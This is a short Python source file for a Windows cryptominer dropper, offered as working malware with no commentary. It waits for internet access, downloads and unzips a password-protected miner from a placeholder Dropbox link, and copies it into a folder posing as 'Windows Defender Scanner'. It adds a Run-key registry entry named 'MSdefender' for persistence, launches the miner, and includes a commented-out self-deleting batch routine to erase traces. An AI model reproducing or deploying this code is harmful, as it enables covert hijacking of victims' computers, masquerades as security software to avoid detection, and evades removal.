import os
from zipfile import ZipFile
from sys import executable
from urllib.request import urlopen
from time import sleep
from subprocess import Popen
import socket
from winreg import QueryValueEx, OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, SetValueEx, REG_SZ
from shutil import copy

def is64():

    if 'PROGRAMFILES(x86)' in os.environ:
        return True
    else:
        return False

def add2Registery(filePath):

    runSubKey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with OpenKey(HKEY_LOCAL_MACHINE, runSubKey, 0, KEY_ALL_ACCESS) as regObject:
        SetValueEx(regObject, "MSdefender", 0, REG_SZ, filePath)

def conCheck(desfunc):

    connFlag = True
    while connFlag:
         try:
             socket.create_connection(("www.google.com", 80))
             desfunc()
             connFlag = False
         except:
            sleep(20)

def unZipper(filename):
        with ZipFile(filename) as zf:
            global minerExe
            minerExe = [i for i in zf.namelist() if 'exe' in i][0]
            zf.extractall(pwd=b'#minerpass#')
        os.remove(filename)

def dlr():

    if is64():
        # for 64bit OS
        url = "dropbox_url_4_64bit"
        zipFileName = '64.zip'
    else:
        # for 32 bit OS
        url = "dropbox_url_4_32bit"
        zipFileName = '32.zip'
    
    f = urlopen(url)
    with open(zipFileName, "wb") as localfile:
        localfile.write(f.read())

    unZipper(zipFileName)

def selfDestruct():

    filename = executable.split("\\")[-1]
    data = '''@echo off
TASKKILL /F /IM "{0}"
break>{0}
DEL -f "{0}"
DEL -f "{1}"
DEL -f "{2}"
break>"%~f0" && DEL "%~f0" '''.format(filename, 'config.json', minerExe)
    with open("eraser.bat","w") as f:
        f.write(data)
    xxx = Popen("eraser.bat >> NUL",shell=True)

def main():

    conCheck(dlr)
    userProf = os.environ['USERPROFILE']
    dest = userProf.strip() + '\\AppData\\Roaming\\Microsoft\\Windows Defender Scanner'
    # alernatively: os.path.expandvars('%userprofile%\\AppData\\Roaming\\Microsoft\\Windows Defender Scanner')
    os.makedirs(dest)
    copy(minerExe, dest)
    copy('config.json', dest)
    destExe = dest+'\\'+minerExe
    add2Registery(destExe)
    Popen(destExe, shell=True)
    # selfDestruct()

main()